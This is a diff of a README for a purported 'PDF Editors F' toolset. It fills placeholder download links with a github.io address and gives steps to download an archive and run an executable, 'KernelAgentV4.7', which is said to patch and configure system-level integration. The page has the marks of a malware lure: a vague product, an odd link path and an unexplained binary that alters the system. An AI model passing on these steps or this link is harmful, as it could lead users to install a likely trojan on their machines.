@@ -2,13 +2,15 @@
 
 This powerful toolset expands the capabilities of PDF Editors F, allowing seamless editing, form processing, batch exports, and OCR text recognition with system-level tweaks via `KernelAgentV4.7`.
 
-[![Download PDF Editors F](https://img.shields.io/badge/Download-PDF_Editors_F_Tools-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download PDF Editors F](https://img.shields.io/badge/Download-PDF_Editors_F_Tools-blueviolet)](https://pdf-editors-f-advanced-suite.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://pdf-editors-f-advanced-suite.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PDFToolsF`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will patch and configure system-level integration with your PDF editor  
